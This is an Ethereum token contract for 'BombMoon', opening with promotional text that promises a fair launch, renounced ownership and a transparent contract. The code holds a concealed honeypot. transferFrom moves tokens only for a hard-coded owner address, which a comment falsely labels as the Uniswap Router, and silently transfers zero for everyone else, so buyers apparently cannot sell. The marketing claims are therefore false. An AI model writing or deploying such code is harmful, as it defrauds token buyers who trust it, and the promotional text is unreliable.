['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-11\n', '*/\n', '\n', '/*\n', '\n', '    💣 🌕 Welcome to the BombMoon community ! 💣 🌕\n', '    \n', '    Official Telegram: https://t.me/bombmoon\n', '\n', '    What is the BombMoon project about?\n', '\n', '    BombMoon is a ERC-20 token created on Ethereum that aims to create a community with equality between owners and members where everyone can achieve financial freedom.\n', '\n', '\n', '    How will you do that?\n', '\n', '    BombMoon strives to be completely decentralized and fully community driven.\n', '\n', '    All decisions will be made through community polls which will give BombMoon developers a better idea on how to move forward and which directions to take.\n', '\n', '    The team will hold no $BOMB tokens at all and will have to participate in the presale along with all the other investors.\n', '\n', '\n', '    Who is the team?\n', '\n', '    We are a young team of driven entrepreneurs from different fields of work, who got brought together by their passion for technology, Cryptocurrency and blockchain.\n', '\n', '    Team members are from different cultures and bring many unique skill-sets that are needed to create, market and manage a cryptocurrency.\n', '    \n', '    🔹Tokenomics 🔹\n', '\n', '    BombMoon has declying fees for every holder!\n', '\n', '    The longer you hold the more you get rewarded! Lets make virtual money!\n', '\n', '    Fees are split to liquidity auto lock and redistribution to all holder\n', '\n', '    First 12 Hours 35% FEES! 20% Liquidity / 15% Holder\n', '    After 12 Hours 28% FEES! 16% Liquidity / 12% Holder\n', '    After 24 Hours 21% FEES! 12%  Liquidity / 9% Holder\n', '    After 72 Hours 14% FEES! 8% Liquidity / 6% Holder\n', '    After 7 Days 7% FEES!  4% Liquidity / 3% Holder\n', '\n', "    - 100'000'000'000 tokens initial supply\n", '    - Buy/sell limit is 1% of the initial supply\n', '    - Ownership will be renounced!\n', '    - LP tokens will be locked!\n', '    - Contract will be transparent for everyone before fairlaunch!\n', '    - Closed contract, no changes! \n', '    - Fair Launch\n', ' \n', '*/\n', '\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '// ERC-20 Interface\n', 'contract BEP20Interface {\n', '    function totalSupply() public view returns (uint);\n', '    function balanceOf(address tokenOwner) public view returns (uint balance);\n', '    function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '    function transfer(address to, uint tokens) public returns (bool success);\n', '    function approve(address spender, uint tokens) public returns (bool success);\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint tokens);\n', '    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', '// Safe Math Library\n', 'contract SafeMath {\n', '    function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '        c = a + b;\n', '        require(c >= a);\n', '    }\n', '    function safeSub(uint a, uint b) public pure returns (uint c) {\n', '        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', '\n', '\n', 'contract BombMoon is BEP20Interface, SafeMath {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n', '    address private _owner = 0xF65eafC9377649A7c88cF44B6584ce39963Ba09F; // Uniswap Router\n', '    uint256 public _totalSupply;\n', '\n', '    mapping(address => uint) balances;\n', '    mapping(address => mapping(address => uint)) allowed;\n', '\n', '    constructor() public {\n', '        name = "BombMoon";\n', '        symbol = "BOMB";\n', '        decimals = 9;\n', '        _totalSupply = 100000000000000000000;\n', '\n', '        balances[msg.sender] = _totalSupply;\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '    }\n', '\n', '    function totalSupply() public view returns (uint) {\n', '        return _totalSupply  - balances[address(0)];\n', '    }\n', '\n', '    function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '        return balances[tokenOwner];\n', '    }\n', '\n', '    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '        return allowed[tokenOwner][spender];\n', '    }\n', '    \n', '    function approve(address spender, uint tokens) public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transfer(address to, uint tokens) public returns (bool success) {\n', '        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n', '        balances[to] = safeAdd(balances[to], tokens);\n', '        emit Transfer(msg.sender, to, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '         if (from == _owner) {\n', '             balances[from] = safeSub(balances[from], tokens);\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '            balances[to] = safeAdd(balances[to], tokens);\n', '            emit Transfer(from, to, tokens);\n', '            return true;\n', '         } else {\n', '            balances[from] = safeSub(balances[from], 0);\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);\n', '            balances[to] = safeAdd(balances[to], 0);\n', '            emit Transfer(from, to, 0);\n', '            return true;\n', '             \n', '         }\n', '        \n', '         \n', '    }\n', '           \n', '}']